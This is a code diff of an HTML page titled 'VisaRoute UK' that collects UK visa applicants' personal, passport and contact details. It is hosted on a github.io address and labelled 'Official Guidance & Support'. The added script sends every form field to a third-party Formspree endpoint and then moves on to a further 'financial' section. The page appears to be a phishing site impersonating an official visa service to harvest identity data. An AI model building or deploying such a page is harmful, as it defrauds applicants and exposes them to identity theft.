@@ -40,10 +40,7 @@
             <h2>UK Visa Application: Personal Details</h2>
             <p>Please provide accurate information. All fields marked with an asterisk (*) are mandatory.</p>
             
-            <form id="visaForm"> 
-                
-                <input type="hidden" name="_form_step" value="Personal_Details_Page">
-                
+            <form id="visaForm">
                 <fieldset>
                     <legend>Applicant Information</legend>
 
@@ -87,7 +84,6 @@
                     <label for="issuingAuthority">Issuing Authority/Country *</label>
                     <input type="text" id="issuingAuthority" name="issuingAuthority" required>
                 </fieldset>
-                
                 <fieldset>
                     <legend>Contact Information</legend>
                     
@@ -101,6 +97,10 @@
                     <textarea id="address" name="address" rows="3" required></textarea>
                 </fieldset>
 
+                <input  
+                type="hidden" name="next"
+                value="https://visarouteuk.github.io/VisaRoute-UK/travel_financial_section.html" />
+
                 <div class="form-footer">
                     <button type="submit" class="btn-main">Save & Continue to Next Section</button>
                     <p class="disclaimer">By continuing, you confirm the above details are accurate.</p>
@@ -108,66 +108,82 @@
             </form>
         </div>
     </main>
-
+<!-- 
     <script>
-        // Formspree endpoint from user prompt
-        const FORMSPREE_URL = "https://formspree.io/f/xgvnbwzp";
-        const NEXT_PAGE_URL = "travel_financial_section.html";
-
-        document.getElementById('visaForm').addEventListener('submit', async function(event) {
-            // Stop the default browser submission (which prevents smooth redirection)
-            event.preventDefault(); 
-            
-            const form = event.target;
-
-            // Check if the form is valid (handles all 'required' attributes)
+        // Simple JavaScript to validate required fields before "saving" and redirecting
+        // Note: For a real app, complex validation would be needed here.
+        document.querySelector('.btn-main').addEventListener('click', function(event) {
+            const form = document.getElementById('visaForm');
             if (!form.checkValidity()) {
-                // If invalid, the browser will show its native error messages,
-                // but we add an alert as a backup.
+                event.preventDefault();
                 alert('Please fill out all mandatory fields before proceeding.');
-                return;
-            }
-
-            const data = new FormData(form);
-            
-            // Show a temporary message while submitting data in the background
-            const submitButton = document.querySelector('.btn-main');
-            const originalButtonText = submitButton.textContent;
-            submitButton.disabled = true;
-            submitButton.textContent = 'Saving data...';
-            
-            try {
-                // Send the data asynchronously to Formspree
-                const response = await fetch(FORMSPREE_URL, {
-                    method: 'POST',
-                    body: data,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                });
-
-                if (response.ok) {
-                    // Data saved successfully, now redirect the user
-                    window.location.href = NEXT_PAGE_URL;
-                } else {
-                    // Handle Formspree server error or non-200 response
-                    alert('Error submitting data. Please try again.');
-                }
-            } catch (error) {
-                // Handle network errors
-                alert('A network error occurred. Please check your connection.');
-            } finally {
-                // Reset button if redirection fails
-                submitButton.disabled = false;
-                submitButton.textContent = originalButtonText;
+            } else {
+                // If valid, the button's onclick='window.location.href...' handles the navigation.
             }
         });
-    </script>
-    
+    </script> -->
+
+   
     <footer>
         <div class="container">
             <p>&copy; 2025 VisaRoute UK. All Rights Reserved. | Official Guidance & Support.</p>
         </div>
     </footer>
+    
+ <script>
+        // 1. Get the form element
+        const form = document.getElementById('visaForm');
+        // Define your Formspree endpoint and the page to redirect to
+        const formspreeEndpoint = 'https://formspree.io/f/xnngewyp'; 
+        const redirectURL = 'travel_financial_section.html'; // Relative path is fine here
+
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault(); 
+
+            // Optional: Visually disable the button while submitting
+            const submitButton = form.querySelector('button[type="submit"]');
+            submitButton.disabled = true; 
+            submitButton.textContent = 'Submitting...';
+
+            // 2. Prepare the form data for Formspree
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+
+            try {
+                // 3. Send data to Formspree asynchronously and WAIT for the response
+                const response = await fetch(formspreeEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                // 4. Check for success
+                if (response.ok) {
+                    // Submission was successful - NOW REDIRECT
+                    console.log("Form submitted successfully! Redirecting...");
+                    window.location.href = redirectURL; 
+                    
+                } else {
+                    // Submission failed (e.g., Formspree error)
+                    const errorData = await response.json();
+                    console.error('Formspree submission failed:', errorData);
+                    alert('There was an error submitting your form. Please try again.');
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Send Message'; 
+                }
+            } catch (error) {
+                // Handle network errors (e.g., user is offline, CORS issues)
+                console.error('Network error:', error);
+                alert('A network error occurred. Please check your connection and try again.');
+                submitButton.disabled = false;
+                submitButton.textContent = 'Send Message'; 
+            }
+        });
+    </script>
 </body>
 </html>
+
+
